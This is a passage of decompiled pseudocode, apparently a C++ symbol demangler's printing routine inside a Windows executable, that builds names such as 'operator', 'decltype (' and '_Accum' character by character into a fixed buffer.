0;\n            }\n            else {\n                iVar25 = iVar14 + 1;\n            }\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = 0x3c;\n            arg1[0x108] = 0x3c;\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            if (arg1[0x108] == '>') {\n                iVar25 = *(arg1 + 0x100);\n                if (iVar25 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar25 = 0;\n                }\n                ppiVar9 = iVar25 + 1;\n                *(arg1 + 0x100) = ppiVar9;\n                arg1[iVar25] = 0x20;\n                arg1[0x108] = 0x20;\n            }\n            else {\n                ppiVar9 = *(arg1 + 0x100);\n            }\n            if (ppiVar9 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar25 = 1;\n                ppiVar9 = NULL;\n            }\n            else {\n                iVar25 = ppiVar9 + 1;\n            }\n            *(arg1 + 0x100) = iVar25;\n            arg1[ppiVar9] = 0x3e;\n            arg1[0x108] = 0x3e;\n        }\n        else {\n            iVar25 = 6;\n            pcVar19 = *(piVar24 + 2);\n            pcVar23 = \"JArray\";\n            do {\n                if (iVar25 == 0) break;\n                iVar25 = iVar25 + -1;\n                bVar32 = *pcVar19 == *pcVar23;\n                pcVar19 = pcVar19 + 1;\n                pcVar23 = pcVar23 + 1;\n            } while (bVar32);\n            if (!bVar32) goto code_r0x004054ff;\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            ppiVar9 = fcn.004046f0(arg1, 0x42d8f4);\n        }\n        *(arg1 + 0x128) = uVar4;\n        break;\n    case 0x405590:\n        uVar7 = *(arg3 + 1);\n        ppiVar10 = *(arg1 + 0x100);\n        if (uVar7 == 0) {\n            pcVar19 = \"this\";\n            do {\n                cVar26 = *pcVar19;\n                if (ppiVar10 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppiVar9 = NULL;\n                    ppiVar10 = 0x1;\n                }\n                else {\n                    ppiVar9 = ppiVar10;\n                    ppiVar10 = ppiVar10 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = ppiVar10;\n                arg1[ppiVar9] = cVar26;\n                arg1[0x108] = cVar26;\n            } while (pcVar19 != \"\");\n        }\n        else {\n            pcVar19 = \"{parm#\";\n            do {\n                cVar26 = *pcVar19;\n                if (ppiVar10 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppiVar9 = NULL;\n                    ppiVar10 = 0x1;\n                }\n                else {\n                    ppiVar9 = ppiVar10;\n                    ppiVar10 = ppiVar10 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = ppiVar10;\n                arg1[ppiVar9] = cVar26;\n                arg1[0x108] = cVar26;\n            } while (pcVar19 != \"\");\n            puVar22 = &stack0xffffffffffffff38;\n            sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, uVar7);\n            puVar17 = puVar22;\n            do {\n                puVar16 = puVar17;\n                uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n                uVar7 = uVar6 & 0x80808080;\n                puVar17 = puVar16 + 1;\n            } while (uVar7 == 0);\n            bVar32 = (uVar6 & 0x8080) == 0;\n            if (bVar32) {\n                uVar7 = uVar7 >> 0x10;\n            }\n            if (bVar32) {\n                puVar17 = puVar16 + 6;\n            }\n            puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n            if (puVar20 == NULL) {\n                iVar25 = *(arg1 + 0x100);\n            }\n            else {\n                iVar25 = *(arg1 + 0x100);\n                puVar17 = puVar20 + puVar22;\n                do {\n                    uVar31 = *puVar22;\n                    if (iVar25 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar14 = 0;\n                        iVar25 = 1;\n                    }\n                    else {\n                        iVar14 = iVar25;\n                        iVar25 = iVar25 + 1;\n                    }\n                    puVar22 = puVar22 + 1;\n                    *(arg1 + 0x100) = iVar25;\n                    arg1[iVar14] = uVar31;\n                    arg1[0x108] = uVar31;\n                } while (puVar22 != puVar17);\n            }\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar9 = 0x1;\n                iVar25 = 0;\n            }\n            else {\n                ppiVar9 = iVar25 + 1;\n            }\n            *(arg1 + 0x100) = ppiVar9;\n            arg1[iVar25] = 0x7d;\n            arg1[0x108] = 0x7d;\n        }\n        break;\n    case 0x405611:\n        *(arg1 + 0x130) = 1;\n        break;\n    case 0x405620:\n        ppiVar9 = arg3[2];\n        if (*ppiVar9 == 0x37) {\n            puVar22 = arg3[1];\n            ppuVar5 = *(puVar22 + 2);\n            puVar21 = *ppuVar5;\n            if ((puVar21[1] == 99) && ((*puVar21 + 0x9d < 2 || (*puVar21 + 0x8e < 2)))) {\n                fcn.00409360(arg1, arg2_00, puVar22);\n                fcn.00401cf0(arg1, 0x3c);\n                fcn.00407f90(arg1, arg2_00, *(arg3[2] + 2));\n                fcn.004046f0(arg1, 0x42db2e);\n                fcn.00407f90(arg1, arg2_00, *(arg3[2] + 4));\n                ppiVar9 = fcn.00401cf0(arg1, 0x29);\n                return ppiVar9;\n            }\n            uVar31 = *puVar22 < 0x31;\n            uVar33 = *puVar22 == 0x31;\n            if (uVar33) {\n                uVar31 = *(ppuVar5 + 2) == 0;\n                uVar33 = *(ppuVar5 + 2) == 1;\n                if (uVar33) {\n                    uVar31 = *ppuVar5[1] < 0x3e;\n                    uVar33 = *ppuVar5[1] == 0x3e;\n                    if (uVar33) {\n                        fcn.00401cf0(arg1, 0x28);\n                        puVar21 = **(arg3[1] + 2);\n                        ppiVar9 = arg3[2];\n                    }\n                }\n            }\n            iVar25 = 3;\n            piVar24 = ppiVar9[1];\n            puVar15 = 0x42d8c2;\n            do {\n                if (iVar25 == 0) break;\n                iVar25 = iVar25 + -1;\n                uVar31 = *puVar21 < *puVar15;\n                uVar33 = *puVar21 == *puVar15;\n                puVar21 = puVar21 + 1;\n                puVar15 = puVar15 + 1;\n            } while (uVar33);\n            uVar31 = (!uVar31 && !uVar33) == uVar31;\n            if ((uVar31) && (uVar31 = *piVar24 == 3,  uVar31)) {\n                uVar31 = **(piVar24 + 4) == 0x29;\n                if (!uVar31) {\n                    *(arg1 + 0x130) = 1;\n                }\n                fcn.00409420(arg1, arg2_00, *(piVar24 + 2));\n            }\n            else {\n                fcn.00409420(arg1, arg2_00, piVar24);\n            }\n            iVar25 = 3;\n            pcVar19 = **(arg3[1] + 2);\n            pcVar23 = pcVar19;\n            pcVar28 = 0x42da84;\n            do {\n                if (iVar25 == 0) break;\n                iVar25 = iVar25 + -1;\n                uVar31 = *pcVar23 == *pcVar28;\n                pcVar23 = pcVar23 + 1;\n                pcVar28 = pcVar28 + 1;\n            } while (uVar31);\n            if (uVar31) {\n                fcn.00401cf0(arg1, 0x5b);\n                fcn.00407f90(arg1, arg2_00, *(arg3[2] + 4));\n                fcn.00401cf0(arg1, 0x5d);\n            }\n            else {\n                iVar25 = 3;\n                pcVar23 = 0x42d8c2;\n                do {\n                    if (iVar25 == 0) break;\n                    iVar25 = iVar25 + -1;\n                    uVar31 = *pcVar19 == *pcVar23;\n                    pcVar19 = pcVar19 + 1;\n                    pcVar23 = pcVar23 + 1;\n                } while (uVar31);\n                if (!uVar31) {\n                    fcn.00409360(arg1, arg2_00, arg3[1]);\n                }\n                fcn.00409420(arg1, arg2_00, *(arg3[2] + 4));\n            }\n            ppiVar9 = arg3[1];\n            if (*ppiVar9 != 0x31) {\n                return ppiVar9;\n            }\n            ppiVar9 = ppiVar9[1];\n            if (*(ppiVar9 + 2) != 1) {\n                return ppiVar9;\n            }\n            if (*ppiVar9[1] != '>') {\n                return ppiVar9[1];\n            }\n            ppiVar9 = fcn.00401cf0(arg1, 0x29);\n            return ppiVar9;\n        }\n        goto code_r0x0040562d;\n    case 0x405640:\n        piVar24 = arg3[1];\n        piVar18 = arg3[2];\n        bVar32 = *piVar24 == 0x31;\n        if (bVar32) {\n            iVar25 = 3;\n            pcVar19 = **(piVar24 + 2);\n            pcVar23 = pcVar19;\n            pcVar28 = 0x42da7e;\n            do {\n                if (iVar25 == 0) break;\n                iVar25 = iVar25 + -1;\n                bVar32 = *pcVar23 == *pcVar28;\n                pcVar23 = pcVar23 + 1;\n                pcVar28 = pcVar28 + 1;\n            } while (bVar32);\n            if ((bVar32) && (*piVar18 == 3)) {\n                if ((**(piVar18 + 2) == 1) && (**(piVar18 + 4) == 0x29)) {\n                    piVar18 = *(piVar18 + 2);\n                }\n            }\n            else if (*piVar18 == 0x37) {\n                fcn.00409420(arg1, arg2_00, *(piVar18 + 2));\n                ppiVar9 = fcn.00409360(arg1, arg2_00, piVar24);\n                return ppiVar9;\n            }\n            fcn.00409360(arg1, arg2_00, piVar24);\n            bVar32 = pcVar19 == NULL;\n            if (!bVar32) {\n                iVar25 = 3;\n                pcVar23 = pcVar19;\n                pcVar28 = 0x42da81;\n                do {\n                    if (iVar25 == 0) break;\n                    iVar25 = iVar25 + -1;\n                    bVar32 = *pcVar23 == *pcVar28;\n                    pcVar23 = pcVar23 + 1;\n                    pcVar28 = pcVar28 + 1;\n                } while (bVar32);\n                if (bVar32) {\n                    ppiVar9 = fcn.00407f90(arg1, arg2_00, piVar18);\n                    return ppiVar9;\n                }\n                iVar25 = 3;\n                pcVar23 = 0x42d8bf;\n                do {\n                    if (iVar25 == 0) break;\n                    iVar25 = iVar25 + -1;\n                    bVar32 = *pcVar19 == *pcVar23;\n                    pcVar19 = pcVar19 + 1;\n                    pcVar23 = pcVar23 + 1;\n                } while (bVar32);\n                if (bVar32) {\n                    iVar25 = *(arg1 + 0x100);\n                    if (iVar25 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar25 = 0;\n                    }\n                    *(arg1 + 0x100) = iVar25 + 1;\n                    arg1[iVar25] = 0x28;\n                    arg1[0x108] = 0x28;\n                    fcn.00407f90(arg1, arg2_00, piVar18);\n                    ppiVar9 = *(arg1 + 0x100);\n                    if (ppiVar9 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        ppiVar9 = NULL;\n                    }\n                    *(arg1 + 0x100) = ppiVar9 + 1;\n                    arg1[ppiVar9] = 0x29;\n                    arg1[0x108] = 0x29;\n                    return ppiVar9;\n                }\n            }\n        }\n        else if (*piVar24 == 0x33) {\n            iVar25 = *(arg1 + 0x100);\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 1;\n                iVar25 = 0;\n            }\n            else {\n                iVar14 = iVar25 + 1;\n            }\n            *(arg1 + 0x100) = iVar14;\n            arg1[iVar25] = 0x28;\n            arg1[0x108] = 0x28;\n            fcn.004090e0(arg1, arg2_00, piVar24 + 2);\n            iVar25 = *(arg1 + 0x100);\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 1;\n                iVar25 = 0;\n            }\n            else {\n                iVar14 = iVar25 + 1;\n            }\n            *(arg1 + 0x100) = iVar14;\n            arg1[iVar25] = 0x29;\n            arg1[0x108] = 0x29;\n        }\n        else {\n            fcn.00409360(arg1, arg2_00, piVar24);\n        }\n        ppiVar9 = fcn.00409420(arg1, arg2_00, piVar18);\n        break;\n    case 0x405680:\n        ppiVar9 = fcn.00409360(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405693:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"operator \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.004090e0(arg1, arg2_00, arg3 + 1);\n        break;\n    case 0x405710:\n        piVar24 = arg3[1];\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"operator\";\n        iVar29 = piVar24[4];\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        puVar21 = *(piVar24 + 2);\n        ppiVar9 = *puVar21 - 0x61;\n        if (*puVar21 - 0x61 < 0x1a) {\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar9 = 0x1;\n                iVar25 = 0;\n            }\n            else {\n                ppiVar9 = iVar25 + 1;\n            }\n            *(arg1 + 0x100) = ppiVar9;\n            arg1[iVar25] = 0x20;\n            arg1[0x108] = 0x20;\n            puVar21 = *(piVar24 + 2);\n        }\n        iVar25 = iVar29;\n        if (puVar21[iVar25 + -1] == 0x20) {\n            iVar25 = iVar29 + -1;\n        }\n        if (iVar25 != 0) {\n            ppiVar10 = *(arg1 + 0x100);\n            puVar15 = puVar21 + iVar25;\n            do {\n                uVar1 = *puVar21;\n                if (ppiVar10 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppiVar9 = NULL;\n                    ppiVar10 = 0x1;\n                }\n                else {\n                    ppiVar9 = ppiVar10;\n                    ppiVar10 = ppiVar10 + 1;\n                }\n                puVar21 = puVar21 + 1;\n                *(arg1 + 0x100) = ppiVar10;\n                arg1[ppiVar9] = uVar1;\n                arg1[0x108] = uVar1;\n            } while (puVar21 != puVar15);\n        }\n        break;\n    case 0x405790:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"operator \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x405810:\n        piVar24 = arg3[2];\n        if (arg3[1] != NULL) {\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n        }\n        iVar25 = *(arg1 + 0x100);\n        if (iVar25 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar14 = 1;\n            iVar25 = 0;\n        }\n        else {\n            iVar14 = iVar25 + 1;\n        }\n        *(arg1 + 0x100) = iVar14;\n        arg1[iVar25] = 0x7b;\n        arg1[0x108] = 0x7b;\n        fcn.00407f90(arg1, arg2_00, piVar24);\n        ppiVar9 = *(arg1 + 0x100);\n        if (ppiVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar25 = 1;\n            ppiVar9 = NULL;\n        }\n        else {\n            iVar25 = ppiVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar25;\n        arg1[ppiVar9] = 0x7d;\n        arg1[0x108] = 0x7d;\n        break;\n    case 0x405890:\n        if (arg3[1] != NULL) {\n            ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        }\n        if (arg3[2] != NULL) {\n            uVar12 = *(arg1 + 0x100);\n            if (0xfd < uVar12) {\n                arg1[uVar12] = 0;\n                (**(arg1 + 0x110))(arg1, uVar12, *(arg1 + 0x118));\n                *(arg1 + 0x100) = 0;\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                uVar12 = 0;\n            }\n            puVar20 = 0x42da68;\n            do {\n                uVar31 = *puVar20;\n                if (uVar12 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    uVar13 = 0;\n                    uVar12 = 1;\n                }\n                else {\n                    uVar13 = uVar12;\n                    uVar12 = uVar12 + 1;\n                }\n                puVar20 = puVar20 + 1;\n                *(arg1 + 0x100) = uVar12;\n                arg1[uVar13] = uVar31;\n                arg1[0x108] = uVar31;\n            } while (puVar20 != 0x42da6a);\n            iVar29 = *(arg1 + 0x138);\n            ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            if ((iVar29 == *(arg1 + 0x138)) && (*(arg1 + 0x100) == uVar12)) {\n                *(arg1 + 0x100) = uVar12 - 2;\n            }\n        }\n        break;\n    case 0x405931:\n        if (*(arg3 + 0x12) != 0) {\n            iVar25 = *(arg1 + 0x100);\n            pcVar19 = \"_Sat \";\n            do {\n                cVar26 = *pcVar19;\n                if (iVar25 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar25 = 1;\n                }\n                else {\n                    iVar14 = iVar25;\n                    iVar25 = iVar25 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar25;\n                arg1[iVar14] = cVar26;\n                arg1[0x108] = cVar26;\n            } while (pcVar19 != \"\");\n        }\n        if (*(arg3[1] + 2) == 0x42ea20) {\n            ppiVar10 = *(arg1 + 0x100);\n        }\n        else {\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            iVar25 = *(arg1 + 0x100);\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar10 = 0x1;\n                iVar25 = 0;\n            }\n            else {\n                ppiVar10 = iVar25 + 1;\n            }\n            *(arg1 + 0x100) = ppiVar10;\n            arg1[iVar25] = 0x20;\n            arg1[0x108] = 0x20;\n        }\n        if (*(arg3 + 2) == 0) {\n            pcVar19 = \"_Fract\";\n            do {\n                cVar26 = *pcVar19;\n                if (ppiVar10 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppiVar9 = NULL;\n                    ppiVar10 = 0x1;\n                }\n                else {\n                    ppiVar9 = ppiVar10;\n                    ppiVar10 = ppiVar10 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = ppiVar10;\n                arg1[ppiVar9] = cVar26;\n                arg1[0x108] = cVar26;\n            } while (pcVar19 != \"\");\n        }\n        else {\n            pcVar19 = \"_Accum\";\n            do {\n                cVar26 = *pcVar19;\n                if (ppiVar10 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppiVar9 = NULL;\n                    ppiVar10 = 0x1;\n                }\n                else {\n                    ppiVar9 = ppiVar10;\n                    ppiVar10 = ppiVar10 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = ppiVar10;\n                arg1[ppiVar9] = cVar26;\n                arg1[0x108] = cVar26;\n            } while (pcVar19 != \"\");\n        }\n        break;\n    case 0x405a00:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"decltype (\";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        ppiVar9 = *(arg1 + 0x100);\n        if (ppiVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar25 = 1;\n            ppiVar9 = NULL;\n        }\n        else {\n            iVar25 = ppiVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar25;\n        arg1[ppiVar9] = 0x29;\n        arg1[0x108] = 0x29;\n        break;\n    case 0x405a80:\n        puVar22 = &stack0xffffffffffffff38;\n        sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, *(arg3 + 1));\n        puVar17 = puVar22;\n        do {\n            puVar16 = puVar17;\n            uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n            uVar7 = uVar6 & 0x80808080;\n            puVar17 = puVar16 + 1;\n        } while (uVar7 == 0);\n        bVar32 = (uVar6 & 0x8080) == 0;\n        if (bVar32) {\n            uVar7 = uVar7 >> 0x10;\n        }\n        if (bVar32) {\n            puVar17 = puVar16 + 6;\n        }\n        puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n        ppiVar9 = uVar7 & 0xffffff00;\n        if (puVar20 != NULL) {\n            ppiVar10 = *(arg1 + 0x100);\n            puVar17 = puVar20 + puVar22;\n            do {\n                uVar31 = *puVar22;\n                if (ppiVar10 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppiVar9 = NULL;\n                    ppiVar10 = 0x1;\n                }\n                else {\n                    ppiVar9 = ppiVar10;\n                    ppiVar10 = ppiVar10 + 1;\n                }\n                puVar22 = puVar22 + 1;\n                *(arg1 + 0x100) = ppiVar10;\n                arg1[ppiVar9] = uVar31;\n                arg1[0x108] = uVar31;\n            } while (puVar22 != puVar17);\n        }\n        break;\n    case 0x405b40:\n        ppiVar9 = *(arg1 + 0x100);\n        uVar7 = *(arg3 + 1);\n        if (ppiVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar25 = 1;\n            ppiVar9 = NULL;\n        }\n        else {\n            iVar25 = ppiVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar25;\n        arg1[ppiVar9] = uVar7;\n        arg1[0x108] = uVar7;\n        break;\n    case 0x405b72:\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x405b93:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"java resource \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405c10:\n        uVar6 = 0;\n        if (*arg3[1] == 0x27) {\n            uVar6 = *(*(arg3[1] + 2) + 0x1c);\n            if (uVar6 != 0) {\n                if (uVar6 < 7) {\n                    piVar24 = arg3[2];\n                    if (*piVar24 == 0) {\n                        if (uVar7 == 0x3c) {\n                            fcn.00401cf0(arg1, 0x2d);\n                            piVar24 = arg3[2];\n                        }\n                        ppiVar9 = fcn.00407f90(arg1, arg2_00, piVar24);\n                        if (6 < uVar6) {\n                            return ppiVar9;\n                        }\n                        ppiVar9 = *(uVar6 * 4 + 0x42dc64) + 0x42dc64;\n                        switch(ppiVar9) {\n                        case 0x404830:\n                            return ppiVar9;\n                        case 0x4077dc:\n                            ppiVar9 = fcn.004046f0(arg1, 0x42da96);\n                            return ppiVar9;\n                        case 0x4077f0:\n                            ppiVar9 = fcn.004046f0(arg1, 0x42da93);\n                            return ppiVar9;\n                        case 0x407804:\n                            ppiVar9 = fcn.004046f0(arg1, 0x42da90);\n                            return ppiVar9;\n                        case 0x407818:\n                            ppiVar9 = fcn.00401cf0(arg1, 0x6c);\n                            return ppiVar9;\n                        case 0x40782a:\n                            ppiVar9 = fcn.00401cf0(arg1, 0x75);\n                            return ppiVar9;\n                        }\n                    }\n                }\n                else if ((((uVar6 == 7) && (piVar24 = arg3[2],  *piVar24 == 0)) && (piVar24[4] == 1)) && (uVar7 == 0x3b)\n                        ) {\n                    if (**(piVar24 + 2) == '0') {\n                        ppiVar9 = fcn.004046f0(arg1, \"false\");\n                        return ppiVar9;\n                    }\n                    if (**(piVar24 + 2) == '1') {\n                        ppiVar9 = fcn.004046f0(arg1, \"true\");\n                        return ppiVar9;\n                    }\n                }\n            }\n        }\n        iVar25 = *(arg1 + 0x100);\n        if (iVar25 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar14 = 1;\n            iVar25 = 0;\n        }\n        else {\n            iVar14 = iVar25 + 1;\n        }\n        *(arg1 + 0x100) = iVar14;\n        arg1[iVar25] = 0x28;\n        arg1[0x108] = 0x28;\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar25 = *(arg1 + 0x100);\n        if (iVar25 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            *arg1 = 0x29;\n            arg1[0x108] = 0x29;\n            uVar7 = *arg3;\n            *(arg1 + 0x100) = 1;\n            if (uVar7 == 0x3c) {\n                iVar14 = 1;\n                goto code_r0x004076d6;\n            }\n        }\n        else {\n            iVar14 = iVar25 + 1;\n            *(arg1 + 0x100) = iVar14;\n            arg1[iVar25] = 0x29;\n            arg1[0x108] = 0x29;\n            if (*arg3 == 0x3c) {\n                if (iVar14 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                }\ncode_r0x004076d6:\n                *(arg1 + 0x100) = iVar14 + 1;\n                arg1[iVar14] = 0x2d;\n                arg1[0x108] = 0x2d;\n            }\n        }\n        if (uVar6 == 8) {\n            iVar25 = *(arg1 + 0x100);\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar25 = 0;\n            }\n            *(arg1 + 0x100) = iVar25 + 1;\n            arg1[iVar25] = 0x5b;\n            arg1[0x108] = 0x5b;\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            ppiVar9 = *(arg1 + 0x100);\n            if (ppiVar9 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                